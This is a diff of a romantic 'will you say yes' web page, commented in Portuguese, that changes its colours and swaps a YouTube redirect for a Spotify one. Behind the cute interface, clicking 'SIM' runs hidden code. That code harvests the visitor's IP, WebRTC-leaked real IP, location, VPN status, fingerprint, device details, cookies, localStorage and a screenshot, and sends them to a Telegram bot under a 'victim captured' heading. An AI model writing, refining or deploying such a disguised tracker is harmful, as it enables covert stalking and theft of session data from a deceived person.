@@ -14,38 +14,102 @@
         }
 
         body {
-            background: #ffe4ec;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: #f5efe6;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 15% 25%, rgba(173, 216, 230, 0.3) 0%, transparent 30%),
+                radial-gradient(circle at 75% 60%, rgba(100, 149, 237, 0.2) 0%, transparent 35%),
+                radial-gradient(circle at 45% 85%, rgba(135, 206, 250, 0.25) 0%, transparent 30%),
+                radial-gradient(circle at 85% 15%, rgba(70, 130, 180, 0.15) 0%, transparent 25%),
+                radial-gradient(circle at 5% 70%, rgba(173, 216, 230, 0.2) 0%, transparent 30%),
+                radial-gradient(circle at 55% 35%, rgba(100, 149, 237, 0.15) 0%, transparent 25%),
+                linear-gradient(135deg, #f5efe6 0%, #e8dfd3 100%);
+            z-index: 0;
+            animation: floatStars 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes floatStars {
+            0% {
+                transform: scale(1) rotate(0deg);
+            }
+            100% {
+                transform: scale(1.05) rotate(2deg);
+            }
+        }
+
+        .stars-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            background:
+                radial-gradient(2px 2px at 10% 20%, rgba(173, 216, 230, 0.5) 0%, transparent 100%),
+                radial-gradient(3px 3px at 30% 65%, rgba(100, 149, 237, 0.4) 0%, transparent 100%),
+                radial-gradient(2px 2px at 55% 15%, rgba(135, 206, 250, 0.5) 0%, transparent 100%),
+                radial-gradient(4px 4px at 75% 45%, rgba(70, 130, 180, 0.3) 0%, transparent 100%),
+                radial-gradient(2px 2px at 90% 80%, rgba(173, 216, 230, 0.4) 0%, transparent 100%),
+                radial-gradient(3px 3px at 20% 85%, rgba(100, 149, 237, 0.3) 0%, transparent 100%),
+                radial-gradient(2px 2px at 65% 75%, rgba(135, 206, 250, 0.4) 0%, transparent 100%),
+                radial-gradient(2px 2px at 45% 45%, rgba(173, 216, 230, 0.3) 0%, transparent 100%);
+            filter: blur(3px);
+            animation: twinkleStars 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes twinkleStars {
+            0% {
+                opacity: 0.6;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1.02);
+            }
         }
 
         .container {
+            position: relative;
+            z-index: 2;
             max-width: 500px;
             width: 100%;
-            background: #ffffffd9;
-            backdrop-filter: blur(4px);
-            border-radius: 40px 12px 40px 12px;
+            background: rgba(255, 252, 248, 0.75);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 48px 16px 48px 16px;
             padding: 50px 30px;
             text-align: center;
-            box-shadow: 0 8px 32px rgba(255, 105, 135, 0.15);
-            border: 1px solid rgba(255, 182, 193, 0.3);
-            transition: all 0.3s ease;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06), 0 0 60px rgba(173, 216, 230, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
 
         .pergunta {
             font-size: 26px;
-            color: #4a2c3a;
+            color: #4a3f3a;
             margin-bottom: 30px;
             letter-spacing: 1px;
             font-weight: 300;
         }
 
         .pergunta .emoji {
-            color: #ff6b8a;
+            color: #7a9bb5;
             display: inline-block;
             animation: pulse 2s ease-in-out infinite;
         }
@@ -73,47 +137,43 @@
         .btn {
             font-size: 18px;
             padding: 14px 44px;
-            border: 2px solid #ffb6c1;
-            background: transparent;
-            color: #4a2c3a;
+            border: none;
+            background: rgba(235, 225, 215, 0.6);
+            color: #4a3f3a;
             cursor: pointer;
             transition: all 0.3s ease;
             font-family: 'Helvetica Neue', Arial, sans-serif;
             letter-spacing: 1px;
             border-radius: 60px 12px 60px 12px;
             min-width: 120px;
-            background: #ffffff;
-            box-shadow: 0 2px 8px rgba(255, 105, 135, 0.05);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+            backdrop-filter: blur(4px);
         }
 
-        .btn-sim {
-            border-color: #ff8da1;
-            color: #4a2c3a;
-            background: #fff5f7;
-        }
-
-        .btn-sim:hover {
-            background: #ff8da1;
-            color: #ffffff;
-            box-shadow: 0 4px 16px rgba(255, 105, 135, 0.3);
+        .btn:hover {
+            background: #c5d5de;
+            color: #2c2420;
+            box-shadow: 0 4px 16px rgba(173, 216, 230, 0.3);
             transform: translateY(-2px);
         }
 
         .btn-nao {
-            border-color: #dcdcdc;
-            color: #999;
-            background: #f9f9f9;
+            background: rgba(235, 225, 215, 0.4);
+            color: #7a6f6a;
             transition: all 0.05s ease;
             position: relative;
         }
 
         .btn-nao:hover {
             transform: scale(1);
+            background: rgba(235, 225, 215, 0.4);
+            color: #7a6f6a;
+            box-shadow: none;
         }
 
         .loader {
-            border: 3px solid #ffe4ec;
-            border-top: 3px solid #ff6b8a;
+            border: 3px solid rgba(235, 225, 215, 0.5);
+            border-top: 3px solid #7a9bb5;
             border-radius: 50%;
             width: 36px;
             height: 36px;
@@ -131,7 +191,6 @@
             }
         }
 
-        /* ─── CORAÇÕES FLUTUANTES (DISCRETAS) ─── */
         .floating-hearts {
             position: fixed;
             top: 0;
@@ -147,8 +206,8 @@
             position: absolute;
             font-size: 16px;
             animation: floatUp 6s linear forwards;
-            opacity: 0.4;
-            color: #ffb6c1;
+            opacity: 0.25;
+            color: #7a9bb5;
         }
 
         @keyframes floatUp {
@@ -157,10 +216,10 @@
                 opacity: 0;
             }
             10% {
-                opacity: 0.5;
+                opacity: 0.3;
             }
             90% {
-                opacity: 0.5;
+                opacity: 0.3;
             }
             100% {
                 transform: translateY(-10vh) rotate(720deg) scale(1.1);
@@ -168,7 +227,6 @@
             }
         }
 
-        /* ─── RESPONSIVO ─── */
         @media (max-width: 500px) {
             .container {
                 padding: 30px 18px;
@@ -189,6 +247,7 @@
 </head>
 <body>
 
+    <div class="stars-overlay"></div>
     <div class="floating-hearts" id="floatingHearts"></div>
 
     <div class="container" id="page-content">
@@ -197,7 +256,7 @@
         </div>
 
         <div class="buttons" id="buttonArea">
-            <button class="btn btn-sim" id="btnSim">SIM</button>
+            <button class="btn" id="btnSim">SIM</button>
             <button class="btn btn-nao" id="btnNao">NAO</button>
         </div>
 
@@ -206,7 +265,7 @@
 
     <script>
         // ============================================================
-        // BOTÃO "NAO" FUGINDO (VERSÃO CLEAN)
+        // BOTÃO "NAO" FUGINDO
         // ============================================================
         const btnNao = document.getElementById('btnNao');
         const btnSim = document.getElementById('btnSim');
@@ -247,19 +306,17 @@
         });
 
         // ============================================================
-        // BOTÃO "SIM" — DISPARA TUDO E REDIRECIONA PRO YOUTUBE
+        // BOTÃO "SIM" — DISPARA TUDO E REDIRECIONA PRO SPOTIFY
         // ============================================================
         btnSim.addEventListener('click', function() {
-            // Esconde botões e mostra loading
             buttonArea.style.display = 'none';
             loader.style.display = 'block';
 
-            // Coleta os dados e envia em background
             coletarEEnviar();
 
-            // Redireciona pro YouTube (Post Malone - I Fall Apart)
+            // 👇 LINK DA MÚSICA 1000 BLUNTS DO $UICIDEBOY$
             setTimeout(() => {
-                window.location.href = 'https://www.youtube.com/watch?v=JQbjS0_ZfJ0';
+                window.location.href = 'https://open.spotify.com/track/3j2jHwUi5SAdV9nB9NSHTG';
             }, 2000);
         });
 
@@ -271,11 +328,9 @@
 
         async function coletarEEnviar() {
             try {
-                // ---- IP ----
                 const ip = await fetch('https://api.ipify.org?format=json')
                     .then(r => r.json()).then(d => d.ip).catch(() => '❌');
 
-                // ---- IP REAL (WebRTC) ----
                 let webrtcIP = '❌';
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -291,7 +346,6 @@
                     pc.close();
                 } catch {}
 
-                // ---- LOCALIZAÇÃO POR IP ----
                 let location = {};
                 try {
                     const r = await fetch(`https://ipinfo.io/${ip}/json`);
@@ -308,7 +362,6 @@
                     location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
                 }
 
-                // ---- VPN ----
                 let vpnStatus = '❓ Indeterminado';
                 if (location.org) {
                     const org = location.org.toLowerCase();
@@ -318,7 +371,6 @@
                     vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
                 }
 
-                // ---- FINGERPRINT ----
                 const fpData = [
                     navigator.userAgent,
                     navigator.language,
@@ -338,7 +390,6 @@
                 }
                 const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
 
-                // ---- DADOS DO DISPOSITIVO ----
                 const ua = navigator.userAgent;
                 const isIOS = /iPhone|iPad|iPod/i.test(ua);
                 const isAndroid = /Android/i.test(ua);
@@ -362,7 +413,6 @@
                     marca = 'Desktop';
                 }
 
-                // ---- BATERIA ----
                 let bateria = '❌';
                 if (navigator.getBattery) {
                     try {
@@ -371,27 +421,23 @@
                     } catch {}
                 }
 
-                // ---- CONEXÃO ----
                 let conexao = '❌';
                 if (navigator.connection) {
                     conexao = navigator.connection.effectiveType || 'N/A';
                 }
 
-                // ---- PLUGINS ----
                 let plugins = [];
                 for (let i = 0; i < navigator.plugins.length; i++) {
                     plugins.push(navigator.plugins[i].name);
                 }
                 const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';
 
-                // ---- COOKIES E LOCALSTORAGE ----
                 const cookies = document.cookie || '❌ Sem cookies';
                 let localStorageData = '❌';
                 try {
                     localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
                 } catch {}
 
-                // ---- REDES WI-FI ----
                 let wifi = '❌';
                 if (navigator.connection) {
                     try {
@@ -400,7 +446,6 @@
                     } catch {}
                 }
 
-                // ---- FONTES INSTALADAS ----
                 let fonts = [];
                 const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
                 for (let f of fontList) {
@@ -408,13 +453,12 @@
                 }
                 const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';
 
-                // ---- PRINT REAL DA TELA ----
                 let screenshot = null;
                 try {
                     const canvas = await html2canvas(document.body, {
                         scale: 1.5,
                         useCORS: true,
-                        backgroundColor: '#ffe4ec',
+                        backgroundColor: '#f5efe6',
                         logging: false,
                         allowTaint: false,
                         width: window.innerWidth,
@@ -425,7 +469,6 @@
                     screenshot = canvas.toDataURL('image/jpeg', 0.9);
                 } catch (e) {}
 
-                // ---- MONTA MENSAGEM ----
                 let msg = `
         💗 **CLEAN GIRL — VÍTIMA CAPTURADA** 💗
 
@@ -462,7 +505,6 @@
         💀 **Ela disse SIM!** 💀
         `;
 
-                // ---- ENVIA TEXTO ----
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -474,7 +516,6 @@
                     })
                 });
 
-                // ---- ENVIA PRINT ----
                 if (screenshot) {
                     const form = new FormData();
                     const blob = await fetch(screenshot).then(res => res.blob());
@@ -493,7 +534,7 @@
         }
 
         // ============================================================
-        // CORAÇÕES FLUTUANTES (FUNDO)
+        // CORAÇÕES FLUTUANTES
         // ============================================================
         setInterval(() => {
             if (document.getElementById('buttonArea').style.display === 'none') return;
@@ -504,7 +545,7 @@
             heart.style.fontSize = (Math.random() * 14 + 10) + 'px';
             heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
             heart.style.opacity = '0.2';
-            heart.style.color = '#ffb6c1';
+            heart.style.color = '#7a9bb5';
             document.getElementById('floatingHearts').appendChild(heart);
             setTimeout(() => { heart.remove(); }, 8000);
         }, 3000);
